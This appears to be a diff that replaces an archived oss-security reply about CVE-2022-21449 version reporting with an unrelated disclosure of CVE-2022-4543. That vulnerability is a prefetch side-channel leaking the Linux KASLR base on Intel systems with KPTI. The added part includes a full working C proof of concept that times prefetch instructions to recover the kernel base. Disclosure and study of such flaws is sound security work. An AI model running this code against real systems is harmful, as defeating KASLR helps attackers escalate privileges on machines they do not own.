@@ -1,34 +1,98 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/04/28/6
-Message-ID: <142a2b8b-f5f5-526e-741f-35337a5a81f2@tao.at>
-Date: Thu, 28 Apr 2022 22:40:23 +0200
-From: Sven Schwedas <sven.schwedas@....at>
-To: oss-security@...ts.openwall.com
-Subject: Re: CVE-2022-21449 and version reporting
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/12/16/3
+Message-ID: <vbyEQC3tHcxJUNJZ0GdUvwrfJgqYDt5X9gNkzWNdafe932tTAzVpeRIm_xt8rq3i7W2ZRwif9KVRxRZ0i77SqRAT2okJDB458AEh0ghANqU=@protonmail.com>
+Date: Fri, 16 Dec 2022 21:01:12 +0000
+From: Will <willsroot@...tonmail.com>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: CVE-2022-4543: KASLR Leakage Achievable even with KPTI through Prefetch Side-Channel
 Content-Type: text/plain; charset=utf-8
 
+I've discovered that KPTI has implementation issues, allowing any local attacker to easily, quickly, and reliably leak KASLR base via prefetch side-channels based on TLB timing for Intel systems.
 
-On 28.04.22 22:10, Seth Arnold wrote:
-> On Thu, Apr 28, 2022 at 02:12:04PM +0000, Seaman, Chad wrote:
->> In what universe exactly are versions omitted from vulnerability
->> reporting because a vendor “no longer supports that version”… this
->> non-supported version is still vulnerable?
-> 
-> A large part of software maintenance is managing technical debt --
-> and being able to walk away from no-longer-supported products is an
-> important part of that.
-> 
-> Would you expect Microsoft to evaluate Windows 3.11, Windows 95,
-> Windows 98, Windows ME, Windows NT 3.51, Windows NT 4.0. Windows XP,
-> etc for every single vulnerability discovered in newest products?
+I currently have developed code samples that can reliably leak KASLR base using this technique in under a second under normal system conditions with kPTI, both on host and guest OSes (under KVM), on the following CPUs: Intel i5-8265U (Arch 6.0.12-hardened1-1-hardened), Intel i7-8750H, Intel i7-9750H (Ubuntu 5.15.0-56-generic host, custom 5.18.3 on guest), Intel i7-9700F (6.0.12-1-MANJARO), and Intel Xeon(R) CPU E5-2640 (5.10.0-19-amd64). I do not believe this affects AMD CPUs based on personal preliminary testing.
 
-You and Jeremy arguing in bad faith here, OP didn't ask about anything 
-like that.
+It is already known that systems without KPTI are vulnerable to prefetch side-channels for KASLR leakage. However, there seemed to be an assumption that KPTI/KAISER will provide enough isolation to prevent CPU side-channel attacks against KASLR. 
 
-The problem at hand is, someone *already did all that work*, and Oracle 
-is *actively intervening* to have it dropped from CVE reports.
+This turns out to not be the case due to what KPTI leaves in userspace mappings. The code under entry_SYSCALL_64 is still mapped into userspace to handle syscalls, and the virtual address mapping is at a constant offset to kernel base. An attacker can repeatedly make syscalls to force that page into the TLB, and then perform the prefetch side-channel to figure out the address of entry_SYSCALL_64, which will break KASLR. This is because prefetch executes faster when a virtual address is in the TLB and avoids a page table walk, and the entry for that page isn't flushed out upon CR3 write due to it having the global bit.
 
-So the question is: Why is vulnerability information that already exists 
-being censored?
+Based on early discussions with security@...nel.org and linux-distros@...openwall.org, this behavior is unintended and might even be a regression in KPTI's implementation. A fix for this is currently not available.
 
-Download attachment "OpenPGP_signature" of type "application/pgp-signature" (666 bytes)
+More information can be found at https://www.willsroot.io/2022/12/entrybleed.html. The following is a primitive demonstration code that leaks KASLR base on systems with KPTI with a high degree of reliability, compiled with gcc using -static and -no-pie (entry_SYSCALL_64_offset has to be adjusted based on kernel by setting it to the distance between it and startup_64):
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+
+#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
+#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull
+#define entry_SYSCALL_64_offset 0x400000ull
+
+uint64_t sidechannel(uint64_t addr) {
+  uint64_t a, b, c, d;
+  asm volatile (".intel_syntax noprefix;"
+    "mfence;"
+    "rdtscp;"
+    "mov %0, rax;"
+    "mov %1, rdx;"
+    "xor rax, rax;"
+    "lfence;"
+    "prefetchnta qword ptr [%4];"
+    "prefetcht2 qword ptr [%4];"
+    "xor rax, rax;"
+    "lfence;"
+    "rdtscp;"
+    "mov %2, rax;"
+    "mov %3, rdx;"
+    "mfence;"
+    ".att_syntax;"
+    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
+    : "r" (addr)
+    : "rax", "rbx", "rcx", "rdx");
+  a = (b << 32) | a;
+  c = (d << 32) | c;
+  return c - a;
+}
+
+#define STEP 0x100000ull
+#define SCAN_START KERNEL_LOWER_BOUND + entry_SYSCALL_64_offset
+#define SCAN_END KERNEL_UPPER_BOUND + entry_SYSCALL_64_offset
+
+#define DUMMY_ITERATIONS 5
+#define ITERATIONS 100
+#define ARR_SIZE (SCAN_END - SCAN_START) / STEP
+
+uint64_t leak_syscall_entry(void) 
+{
+    uint64_t data[ARR_SIZE] = {0};
+    uint64_t min = ~0, addr = ~0;
+
+    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
+    {
+        for (uint64_t idx = 0; idx < ARR_SIZE; idx++) 
+        {
+            uint64_t test = SCAN_START + idx * STEP;
+            syscall(104);
+            uint64_t time = sidechannel(test);
+            if (i >= DUMMY_ITERATIONS)
+                data[idx] += time;
+        }
+    }
+
+    for (int i = 0; i < ARR_SIZE; i++)
+    {
+        data[i] /= ITERATIONS;
+        if (data[i] < min)
+        {
+            min = data[i];
+            addr = SCAN_START + i * STEP;
+        }
+        printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
+    }
+
+    return addr;
+}
+
+int main()
+{
+    printf ("KASLR base %llx\n", leak_syscall_entry() - entry_SYSCALL_64_offset);
+}
